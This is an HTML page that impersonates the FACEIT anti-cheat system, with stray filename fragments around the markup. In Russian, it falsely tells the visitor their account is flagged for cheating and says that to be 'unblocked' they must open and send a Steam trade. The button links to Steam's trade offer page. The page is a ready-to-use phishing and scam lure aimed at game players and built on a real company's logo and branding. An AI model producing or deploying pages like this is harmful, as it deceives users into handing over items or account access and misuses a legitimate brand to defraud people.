# f<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FACEIT Anti-Cheat</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0e0e10;
            color: white;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        
        .modal {
            background-color: #1e1e22;
            border-radius: 8px;
            width: 400px;
            padding: 25px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
            text-align: center;
        }
        
        .logo {
            width: 150px;
            margin-bottom: 20px;
        }
        
        h1 {
            color: #ff5500;
            font-size: 24px;
            margin-bottom: 15px;
        }
        
        p {
            margin-bottom: 20px;
            line-height: 1.5;
        }
        
        .warning {
            background-color: #2a2a2e;
            padding: 15px;
            border-left: 4px solid #ff5500;
            margin-bottom: 20px;
            text-align: left;
        }
        
        .btn {
            background-color: #ff5500;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        
        .btn:hover {
            background-color: #e04b00;
        }
    </style>
</head>
<body>
    <div class="modal">
        <img src="https://faceit.com/static/images/frontpage/faceit_logo.svg" alt="FACEIT Logo" class="logo">
        <h1>АНТИ-ЧИТ СИСТЕМА</h1>
        <div class="warning">
            Наша система обнаружила подозрительную активность в вашем аккаунте. Вы подозреваетесь в использовании бота или читов.
        </div>
        <p>
            Чтобы подтвердить, что вы не бот, вам необходимо отправить любой Steam-трейд любому пользователю.
        </p>
        <p>
            После подтверждения трейда ваша учетная запись будет разблокирована в течение 24 часов.
        </p>
        <button class="btn" onclick="window.open('https://steamcommunity.com/tradeoffer/new/', '_blank')">
            Открыть Steam Трейд
        </button>
    </div>
</body>
</html>aceit.batr1k
